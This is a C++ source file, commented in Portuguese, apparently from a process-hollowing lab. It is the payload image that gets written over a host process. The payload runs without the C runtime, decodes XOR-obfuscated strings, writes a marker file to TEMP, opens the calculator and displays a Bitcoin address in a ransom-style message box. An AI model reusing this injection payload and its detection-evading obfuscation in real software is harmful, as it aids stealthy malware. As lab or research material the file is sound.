// ---------------------------------------------------------------------------
// payload.cpp — imagem implantada no processo hospedeiro.
//
// Sem CRT: entry point proprio (payload_entry), linkado com -nostdlib. Isso
// mantem SizeOfImage na casa dos KB (o host precisa ser >= payload) e evita
// depender da inicializacao do runtime, que o loader so' faz parcialmente
// quando a imagem e' escrita por cima da do host.
//
// Faz tres coisas:
//   1. abre a calculadora
//   2. mostra o endereco BTC (string ofuscada em tempo de build)
//   3. grava um marcador para validacao automatica em laboratorio
//
// Nenhuma string em claro: tools/gen_secret.py gera strings.h com bytes XORados.
// ---------------------------------------------------------------------------
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include "strings.h"

extern "C" {

// --- stubs de libc (link sem CRT: nada de memset do runtime) ---------------
void* memset(void* dst, int c, unsigned long long n)
{
    auto* p = static_cast<unsigned char*>(dst);
    while (n--) *p++ = static_cast<unsigned char>(c);
    return dst;
}

void* memcpy(void* dst, const void* src, unsigned long long n)
{
    auto* a = static_cast<unsigned char*>(dst);
    auto* b = static_cast<const unsigned char*>(src);
    while (n--) *a++ = *b++;
    return dst;
}

static void Deobfuscate(char* out, const unsigned char* src, unsigned n)
{
    for (unsigned i = 0; i < n; ++i)
        out[i] = static_cast<char>(src[i] ^ static_cast<unsigned char>(kKey + i));
    out[n] = '\0';
}

// Prova de execucao sem depender de GUI.
static void WriteMarker(const char* tag)
{
    char path[MAX_PATH]{};
    DWORD n = GetEnvironmentVariableA("TEMP", path, MAX_PATH);
    if (!n || n >= MAX_PATH - 20) return;

    lstrcatA(path, "\\hollow_marker.txt");

    HANDLE f = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return;

    char line[600]{};
    char host[MAX_PATH]{};
    GetModuleFileNameA(nullptr, host, MAX_PATH);

    int len = wsprintfA(line, "tag=%s pid=%lu host=%s\r\n",
                        tag, GetCurrentProcessId(), host);
    DWORD wrote = 0;
    WriteFile(f, line, static_cast<DWORD>(len), &wrote, nullptr);
    CloseHandle(f);
}

__declspec(noreturn) void payload_entry(void)
{
    char tag[64]{};
    Deobfuscate(tag, kTag, kTagLen);
    WriteMarker(tag);

    char calcPath[64]{};
    Deobfuscate(calcPath, kCalc, kCalcLen);
    WinExec(calcPath, SW_SHOWNORMAL);

    char addr[128]{}, title[64]{};
    Deobfuscate(addr,  kAddr,  kAddrLen);
    Deobfuscate(title, kTitle, kTitleLen);
    MessageBoxA(nullptr, addr, title, MB_OK | MB_ICONINFORMATION);

    ExitProcess(0);
}

} // extern "C"
